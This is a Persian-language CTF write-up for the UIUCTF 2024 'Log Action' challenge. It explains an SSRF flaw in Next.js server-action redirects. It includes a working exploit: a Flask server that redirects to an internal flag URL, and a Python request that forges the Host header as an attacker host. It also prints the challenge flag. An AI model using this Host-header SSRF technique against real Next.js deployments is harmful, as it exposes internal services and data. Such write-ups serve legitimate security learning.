---
tags:
  - UIU CTF
  - UIUCTF-2024
  - Web
  - SSRF
  - Next.js
---

 
زمان مطالعه: ۵ دقیقه $~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$  <a href="https://tools.pdf24.org/en/webpage-to-pdf" target="_blank">دانلود PDF :closed_book:</a> 

---

# چالش Log Action

توی این چالش به ما دوتا وب سرور دادن که یکی از اون ها که Next.js هستش به صورت پابلیک پابلیش شده ولی وب سروری که فلگ در آن قرار داره پورتش پابلیش نشده و فقط از داخل نتورک داخلی داکر در دسترس هستش

> [لینک سورس کد چالش](https://uiuctf-2024-rctf-challenge-uploads.storage.googleapis.com/uploads/eb5b17b1e10f9f5838cb671042bbf9ee7baaa71c0c00bcd0935fd34c420b0139/log-action.zip)


```yml
version: '3'
services:
  frontend:
    build: ./frontend
    restart: always
    environment:
      - AUTH_TRUST_HOST=http://localhost:3000
    ports:
      - "3000:3000"
    depends_on:
      - backend
  backend:
    image: nginx:latest
    restart: always
    volumes:
      - ./backend/flag.txt:/usr/share/nginx/html/flag.txt
```
همانطور که در داکر کامپوز مشخص هست. فلگ در سرویس backend قرار داره ولی پورتی به بیرون پابلیش نشده و فقط از داخل frontend که در دسترس هست میتوانیم به nginx برسیم

بعد از بررسی فایل های next.js ، به طور مستقیم راهی برای اینکه از frontend به backend برسم پیدا نکردم
و سعی کردم آسیب پذیری پیدا کنم که منجر به SSRF توی next.js بشه و خوشبختانه یک آسیب پذیری ssrf توی ورژن 14.1.0 پیدا شد

> تمامی اطلاعات درباره آسیب پذیری در [اینجا](https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps) قرار دارد

برای اینکه من بتونم ssrf بگیرم باید از action ای توی next استفاده کنم که به مسیری که با `/`  شروع میشه ریدایرکت بشه. چرا؟ به خاطر این کد سمت next.js:

```typescript
async function createRedirectRenderResult(
  req: IncomingMessage,
  res: ServerResponse,
  redirectUrl: string,
  basePath: string,
  staticGenerationStore: StaticGenerationStore
) {
  res.setHeader('x-action-redirect', redirectUrl)
  // if we're redirecting to a relative path, we'll try to stream the response
  if (redirectUrl.startsWith('/')) {
    const forwardedHeaders = getForwardedHeaders(req, res)
    forwardedHeaders.set(RSC_HEADER, '1')

    const host = req.headers['host']
    const proto =
      staticGenerationStore.incrementalCache?.requestProtocol || 'https'
    const fetchUrl = new URL(`${proto}://${host}${basePath}${redirectUrl}`)
    // .. snip ..
    try {
      const headResponse = await fetch(fetchUrl, {
        method: 'HEAD',
        headers: forwardedHeaders,
        next: {
          // @ts-ignore
          internal: 1,
        },
      })

      if (
        headResponse.headers.get('content-type') === RSC_CONTENT_TYPE_HEADER
      ) {
        const response = await fetch(fetchUrl, {
          method: 'GET',
          headers: forwardedHeaders,
          next: {
            // @ts-ignore
            internal: 1,
          },
        })
        // .. snip ..
        return new FlightRenderResult(response.body!)
      }
    } catch (err) {
      // .. snip ..
    }
  }

  return RenderResult.fromStatic('{}')
}
```

وقتی که سمت سرور ریدایرکتی انجام بشه این فانکش کال میشه و نکته جالب این فانکشن این هستش که اگه url با `/` شروع بشه ، ابتدا یک ریکویست *HEAD* و اگر `content-type` ریسپانس برابر با `text/x-component` باشه ، بعدش به همون url یک ریکویست *GET* زده میشه و هاست اندپوینت هم از `HOST` هدر گرفته میشه و بدین ترتیب ما میتونیم ssrf بزنیم

روش اصلی و مورد انتظار طراح سوال به این ترتیب بوده که ما از مسیر `/logout` استفاده کنیم ، چون در مسیر logout از redirect درون action فورم استفاده شده

```ts
import Link from "next/link";
import { redirect } from "next/navigation";
import { signOut } from "@/auth";

export default function Page() {
  return (
    <>
      <h1 className="text-2xl font-bold">Log out</h1>
      <p>Are you sure you want to log out?</p>
      <Link href="/admin">
        Go back
      </Link>
      <form
        action={async () => {
          "use server";
          await signOut({ redirect: false });
          redirect("/login"); # HERE
        }}
      >
        <button type="submit">Log out</button>
      </form>
    </>
  )
```

ولی از اونجایی که من برای اولین بار بود که با next.js دست و پنجه نرم میکردم ، به این کد logout دقت نکردم و سریع رفتم سراغ این action

```ts
"use server";
import { AuthError } from "next-auth";
import { signIn } from "@/auth";
import { redirect } from "next/navigation";
 
export async function authenticate(
  prevState: string | undefined,
  formData: FormData,
) {
  let foundError = false;
  try {
    await signIn('credentials', formData);
  } catch (error) {
    if (error instanceof AuthError) {
      foundError = true;
      switch (error.type) {
        case 'CredentialsSignin':
          return 'Invalid credentials.';
        default:
          return 'Something went wrong.';
      }
    }
    throw error;
  } finally {
    if (!foundError) {
      redirect('/admin');
    }
  }
}
```

و تنها راه برای اینکه بتونم به اون `redirect` توی بلاک finally برسم ، این بود که اون متغیر `foundError` فالس بمونه و تغییر نکنه
ولی از اونجایی که فانکشن `signIn` اگه password ادمین رو درست وارد نکنی ارور AuthError میده ، پس اون `foundError` به `true` تغییر میکنه و ریدایرکتی انجام نمیشه

کد فانکشن signIn


```ts
import NextAuth, { CredentialsSignin } from "next-auth";
import Credentials from "next-auth/providers/credentials";
import { z } from "zod";
import type { User } from "next-auth";
import { authConfig } from "@/auth.config";
import { randomBytes } from "crypto";

export const { auth, signIn, signOut } = NextAuth({
  ...authConfig,
  providers: [
    Credentials({
      async authorize(credentials) {
        const parsedCredentials = z
          .object({ username: z.string(), password: z.string() })
          .safeParse(credentials);

        if (parsedCredentials.success) {
          const { username, password } = parsedCredentials.data;
          // Using a one-time password is more secure
          if (username === "admin" && password === randomBytes(16).toString("hex")) {
            return {
              username: "admin",
            } as User;
          }
        }
        throw new CredentialsSignin;
      },
    }),
  ]
});
```

راهی برای اینکه توی این فانکشن signIn اروری بخوریم که از نوع AuthError نباشه نیست

البته من تلاش کردم که از لایبری zod ارور ZODError بگیرم ولی چون از متد safeParse به جای parse استفاده شده بود. راهی برای این کار هم نبود

بعد از کلی تلاش که راهی برای ریدایرکت کردن پیدا کنم ، به طور اتفاقی موقعی که ریکویست POST به این ACTION میزدم ، اومدم هدر Host رو به `https://attacker.com` تغییر دادم و متوجه شدم که سمت  next.js به ارور  UnknownAction خورد و از اونجایی که اون redirect داخل بلاک finally بود . در هر صورت اجرا میشد
و اینطوری بود که تونستم ریدایرکت بگیرم ولی به کجا؟
به `https`!!

اونجا بود که فهمیدم مقدار هدر هاست رو دارم اشتباهی میدم  و اون پروتکلشو حذف کردم و `attacker.com` رو تست کردم ولی متاسفانه دیگه به اون ریدایرکت نرسیدم ولی یه سعی دیگه کردم و `//` رو به اخر هدر هاست اضافه کردم و دیدم که بعله به ‍`attacker.com` ریدایرکت شدم


# خوندن فلگ
برای اینکه بتونم فلگ رو بخونم باید به وب سرور خودم ریدارکت میکردم و از اون جا به `http://backend/flag.txt` که backend به ip داکر سرویس backend مپ میشه ریدایرکت میکردم مسیر رو

وب سرور فلسک

```python
from flask import Flask, Response, request, redirect
app = Flask(__name__)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch(path):
    if request.method == 'HEAD':
        resp = Response("")
        resp.headers['Content-Type'] = 'text/x-component'
        return resp
    return redirect('http://backend/flag.txt')

app.run(host="0.0.0.0", port=4000)
```

و برای ریکویست post


```python
import requests


headers = {
    "Host":"attacker-ip:4000//", # the flask server (note to // at the end of host is required)
    "Next-Action":"5cdaa80b9099b9973b11269421a40d52c0e11f31", # the action id of next.js
}
res = requests.post("http://log-action.challenge.uiuc.tf/login", headers=headers, data="{}")

print(res.text)
```

---
??? success "FLAG :triangular_flag_on_post:"
    <div dir="ltr">`uiuctf{close_enough_nextjs_server_actions_welcome_back_php}`</div>


!!! نویسنده
    [amir303](https://x.com/amir3O3)

